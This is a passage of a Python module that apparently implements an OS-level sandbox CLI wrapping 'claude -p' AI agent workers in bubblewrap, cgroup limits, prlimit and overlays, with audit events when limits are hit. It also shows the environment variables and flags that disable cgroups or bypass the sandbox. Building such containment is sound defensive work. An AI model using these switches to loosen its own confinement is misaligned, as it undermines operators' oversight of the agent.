    sandbox = BwrapSandbox(bwrap_path=bwrap_path)
    extra_env: dict[str, str] = {}
    for pair in args.env or []:
        if "=" not in pair:
            sys.stderr.write(f"--env expects KEY=VALUE, got {pair!r}\n")
            return 2
        key, _, value = pair.partition("=")
        extra_env[key] = value
    readonly = [Path(p) for p in (args.readonly_path or [])]

    # S2 overlay wiring (spec §3.2 + §4.2). Only --overlay-mode=copy is wired
    # this session; bind / overlayfs raise per spec defer table (§10).
    overlay_mode = (
        os.environ.get("BMAD_OVERLAY_MODE", "").strip().lower()
        or args.overlay_mode
    )
    if overlay_mode not in ("copy", "bind", "overlayfs"):
        sys.stderr.write(
            f"--overlay-mode={overlay_mode!r} invalid (copy|bind|overlayfs)\n"
        )
        return 2
    # S5 AC7: if overlayfs requested AND kernel allows unprivileged user
    # namespaces, fall back к copy mode (CVE-2021-3493 class risk). Resolves
    # BEFORE the bind/overlayfs guard so the safe path also works without
    # BMAD_ALLOW_OVERLAYFS opt-in.
    overlay_mode = _check_userns_safety(overlay_mode)
    if overlay_mode in ("bind", "overlayfs"):
        sys.stderr.write(
            f"--overlay-mode={overlay_mode} not wired yet (S2 wires copy only; "
            "bind / overlayfs deferred per spec §3.2 + §10).\n"
        )
        return 2

    overlay_source: Path | None = None
    if args.overlay_source:
        overlay_source = Path(args.overlay_source)
        if not overlay_source.is_absolute():
            sys.stderr.write(
                f"--overlay-source must be absolute: {args.overlay_source!r}\n"
            )
            return 2
        if not overlay_source.exists():
            sys.stderr.write(
                f"--overlay-source does not exist: {overlay_source}\n"
            )
            return 2

    wt_path = Path(args.worktree)
    wrapped = sandbox.wrap_command(
        list(args.command),
        worktree=wt_path,
        readonly_paths=readonly or None,
        network=args.network,
        env=extra_env or None,
        worker_home_overlay=overlay_source,
    )

    # S3 cgroup composition (spec §3.4 + §5.1). Default ON when systemd-run
    # --user is available + caller did not opt out via env. ALLOW path never
    # reaches here (we exec'd already above on missing/version-fail bwrap).
    cgroup_explicitly_disabled = _cgroup_disabled_by_env() or bool(
        getattr(args, "no_cgroup", False)
    )
    cgroup_required = _cgroup_required()
    if cgroup_explicitly_disabled and cgroup_required:
        # Operator footgun — cgroup explicitly required AND explicitly
        # disabled. REQUIRE wins (mirrors REQUIRE+ALLOW conflict resolution).
        _emit_sandbox_audit(
            "policy_conflict_resolved_to_require",
            schema_version="1",
            require_cgroup=True,
            cgroup_disabled_env=True,
            outcome="hard_fail_exit_78",
        )
        sys.stderr.write(
            "BMAD_REQUIRE_CGROUP=1 + BMAD_SANDBOX_CGROUP=0 are mutually "
            "exclusive; REQUIRE wins.\n"
        )
        return EXIT_SANDBOX_UNAVAILABLE

    scope_unit: str | None = None
    cgroup_prefix: list[str] = []
    if not cgroup_explicitly_disabled:
        available, sd_path = _systemd_run_available()
        if available:
            assert sd_path is not None
            scope_unit = _scope_unit_name(wt_path)
            limits = _resolved_cgroup_limits()
            cgroup_prefix = [
                sd_path,
                "--user",
                "--scope",
                "--quiet",
                f"--unit={scope_unit}.scope",
            ]
            for key, value in limits.items():
                cgroup_prefix += ["-p", f"{key}={value}"]
            cgroup_prefix += ["--"]
        else:
            if cgroup_required:
                _emit_sandbox_audit(
                    "cgroup_required_but_unavailable",
                    schema_version="1",
                    outcome="hard_fail_exit_78",
                    systemd_run_path=sd_path,
                    xdg_runtime_dir=os.environ.get("XDG_RUNTIME_DIR", ""),
                )
                sys.stderr.write(
                    "BMAD_REQUIRE_CGROUP=1 set but systemd-run --user is "
                    "unavailable (need systemd user manager + "
                    "$XDG_RUNTIME_DIR). Install systemd or unset env.\n"
                )
                return EXIT_SANDBOX_UNAVAILABLE
            _emit_sandbox_audit(
                "cgroup_unavailable_fallback_prlimit",
                schema_version="1",
                systemd_run_path=sd_path,
                xdg_runtime_dir=os.environ.get("XDG_RUNTIME_DIR", ""),
                outcome="proceeding_with_prlimit_only",
            )

    full = cgroup_prefix + wrapped if cgroup_prefix else wrapped

    if not cgroup_prefix:
        # No cgroup composition → keep historical execvp behavior for
        # zero-overhead pass-through. Preserves S1/S2 test semantics on
        # hosts без systemd-user.
        os.execvp(full[0], full)  # noqa: S606 — intentional shell-less exec
        return 0  # unreachable

    # Cgroup path: subprocess.Popen so we can observe pids.events on exit
    # and emit cgroup_tasks_max_hit audit when TasksMax engaged. We tee
    # stdout/stderr through directly (inherit fds) so the worker behaves
    # identically to execvp's pass-through. A background poller thread
    # snapshots pids.events while the child is alive — systemd reaps the
    # transient scope shortly after the inner process exits, so we cannot
    # rely on reading the file after wait().
    import subprocess
    import threading

    assert scope_unit is not None
    scope_cg = _scope_cgroup_path(scope_unit)
    max_seen = [0]  # box for thread-shared state

    def _poll_pids_events() -> None:
        # Poll until cgroup disappears or we see a max event. 50ms cadence
        # balances responsiveness against syscall overhead.
        import time as _t
        while True:
            if not scope_cg.exists():
                return
            current = _read_pids_max_count(scope_cg)
            if current > max_seen[0]:
                max_seen[0] = current
            _t.sleep(0.05)

    poller = threading.Thread(target=_poll_pids_events, daemon=True)
    poller.start()
    try:
        proc = subprocess.Popen(full)  # noqa: S603 — argv list, shell=False
        rc = proc.wait()
    finally:
        # Watcher thread is daemon; final pids.events read after wait()
        # catches the case where the scope outlives the inner pid briefly.
        try:
            final = _read_pids_max_count(scope_cg)
            if final > max_seen[0]:
                max_seen[0] = final
        except OSError:
            # cgroup already reaped — pids.events disappeared. Observability
            # gap is acceptable; the poller thread caught it if it hit.
            pass

    if max_seen[0] > 0:
        _emit_sandbox_audit(
            "cgroup_tasks_max_hit",
            schema_version="1",
            tasks_max=_resolved_cgroup_limits().get("TasksMax", DEFAULT_CGROUP_TASKS_MAX),
            cgroup_scope=f"{scope_unit}.scope",
            max_events_observed=max_seen[0],
            worker_exit_code=rc,
            outcome="worker_killed_or_fork_blocked",
        )
    return rc


def _build_wrap_parser():
    """Build the top-level argparse parser. Returns ArgumentParser."""
    import argparse
    parser = argparse.ArgumentParser(
        prog="python -m bmad_orchestrator.runtime.sandbox",
        description=(
            "OS-level sandbox CLI for worker spawn (Q-260527-WTISO-BW). "
            "Composes bwrap+prlimit+cgroup+overlay around `claude -p` workers."
        ),
    )
    sub = parser.add_subparsers(dest="subcommand", required=True)

    wrap = sub.add_parser(
        "wrap",
        help="Wrap a worker command with bwrap+prlimit+cgroup isolation.",
    )
    wrap.add_argument("--worktree", required=True, help="Writable mount root.")
    wrap.add_argument(
        "--network",
        choices=("none", "github_only", "full"),
        default="none",
        help="Network policy (default: none).",
    )
    wrap.add_argument(
        "--allow-nosandbox",
        type=int,
        choices=(0, 1),
        default=0,
        help="Operator opt-in for hard-fail bypass (force-sequential).",
    )
    wrap.add_argument(
        "--overlay-mode",
        choices=("copy", "bind", "overlayfs"),
        default="copy",
        help="Overlay strategy for ~/.claude per-worker (S2 scope).",
    )
    wrap.add_argument(
        "--overlay-source",
        default=None,
        help="Path to overlay snapshot prepared in Step 2 (S2 scope).",
    )
    wrap.add_argument(
        "--readonly-path",
        action="append",
        default=[],
        help="Extra read-only bind mounts (repeatable).",
    )
    wrap.add_argument(
        "--env",
        action="append",
        default=[],
        help="Pass extra env vars KEY=VALUE (repeatable).",
    )
    wrap.add_argument(
        "--no-cgroup",
        action="store_true",
        help=(
            "Disable cgroup composition (skip systemd-run --user --scope). "
            "Equivalent to env BMAD_SANDBOX_CGROUP=0. Refused if "
            "BMAD_REQUIRE_CGROUP=1 (precedence matrix §5.1)."
        ),
    )
    wrap.add_argument(
        "command",
        nargs=argparse.REMAINDER,
        help="Worker command after `--` (e.g. claude -p ARGS).",
    )
    wrap.set_defaults(handler=_cmd_wrap)
    return parser


def _main(argv: list[str] | None = None) -> int:
    """Entry point for ``python -m bmad_orchestrator.runtime.sandbox``."""
    parser = _build_wrap_parser()
    args = parser.parse_args(argv)
    # argparse REMAINDER keeps the leading `--` separator if present; strip
    # so callers can pass `-- /bin/echo hi` without seeing `--` in argv[0].
    if args.command and args.command[0] == "--":
        args.command = args.command[1:]
    if not args.command:
        parser.error("worker command required after `--`")
    return args.handler(args)


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv[1:]))


__all__ = [
    "DEFAULT_CGROUP_CPU_QUOTA",
    "DEFAULT_CGROUP_LIMITS",
    "DEFAULT_CGROUP_MEMORY_MAX",
    "DEFAULT_CGROUP_TASKS_MAX",
    "EXIT_SANDBOX_UNAVAILABLE",
    "BashDenyList",
    "BwrapSandbox",
    "FsDenyList",
    "NetworkPolicy",
    "NoSandbox",
    "Sandbox",
    # S3 cgroup + NoSandbox policy helpers (spec §3.4 + §5.1)
    "_allow_nosandbox",
    "_assert_no_docker_group",
    "_cgroup_disabled_by_env",
    # S5 boot-time threat closures (spec §6.1 + §11 #7 + AC6/AC7)
    "_check_userns_safety",
    # S2 overlay helpers (spec §3.2)
    "_cleanup_overlays",
    "_current_groups",
    "_docker_socket_present",
    "_prepare_overlay_for_worker",
    "_prepare_overlays_master",
    "_read_pids_max_count",
    "_require_sandbox",
    "_resolved_cgroup_limits",
    "_sandbox_backend_none_requested",
    "_scope_cgroup_path",
    "_sweep_stale_overlays",
    "_userns_clone_enabled",
    "compile_deny_lists",
    "detect_sandbox",
    "match_bash_deny",
    "match_fs_deny",
]
